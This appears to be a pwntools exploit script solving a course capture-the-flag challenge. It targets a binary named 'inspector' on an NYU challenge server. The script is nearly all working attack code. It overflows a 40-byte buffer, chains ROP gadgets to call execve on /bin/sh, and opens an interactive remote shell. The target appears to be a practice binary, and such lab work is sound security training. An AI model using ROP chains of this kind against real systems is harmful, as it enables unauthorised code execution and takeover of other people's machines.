import os
import string
import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

binary = './inspector'
context.binary = binary
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    # '0x400672', # gets
    '0x400678', # RET
    # '0x400621', # gadget 1
]

print_statements = []

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)


pop_rdi_ret = 0x0040062e #: pop rdi ; ret
pop_rsi_ret = 0x00400636 #: pop rsi ; ret
pop_rdx_ret = 0x0040063e # : pop rdx ; ret
pop_rax_ret = 0x00400646 #: pop rax ; ret

syscall = 0x00400625
bin_sh = 0x00400708

# with process(['pwndbg', binary] + commands) as p:
with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1342) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    if not is_remote:
        p.sendline(b'r')


    p.recvuntil(b"Please pop a shell!")

    payload = b'A' * 40
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(pop_rax_ret)
    payload += p64(0x3b)
    payload += p64(pop_rsi_ret)
    payload += p64(0x0)
    payload += p64(pop_rdx_ret)
    payload += p64(0x0)
    payload += p64(syscall)
    p.sendline(payload)

    p.interactive()
